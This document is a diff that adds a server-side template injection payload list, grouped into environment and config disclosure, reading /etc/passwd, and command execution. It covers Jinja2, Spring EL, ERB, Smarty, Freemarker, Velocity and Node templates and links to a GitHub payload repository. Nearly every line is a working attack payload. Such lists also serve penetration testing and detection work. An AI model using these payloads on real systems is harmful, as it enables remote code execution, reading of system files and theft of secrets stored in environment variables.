@@ -1,1 +1,27 @@
 
+Info:
+{{config}}
+${T(java.lang.System).getenv()}
+<%= ENV %>
+{$smarty.server}
+#{process.env}
+
+
+File Read:
+{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
+${new java.util.Scanner(new java.io.File('/etc/passwd')).useDelimiter('\\Z').next()}
+<%= File.read('/etc/passwd') %>
+{php}echo file_get_contents('/etc/passwd');{/php}
+{{lipsum.__globals__['os'].popen('cat /etc/passwd').read()}}
+
+RCE:
+{{lipsum.__globals__['os'].popen('id').read()}}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+<%= system('id') %>
+{php}system('id');{/php}
+${"freemarker.template.utility.Execute"?new()("id")}
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($ex=$rt.getRuntime().exec('id'))
+#{process.mainModule.require('child_process').execSync('id').toString()}
+
+
+https://github.com/payload-box/ssti-advanced-payload-list
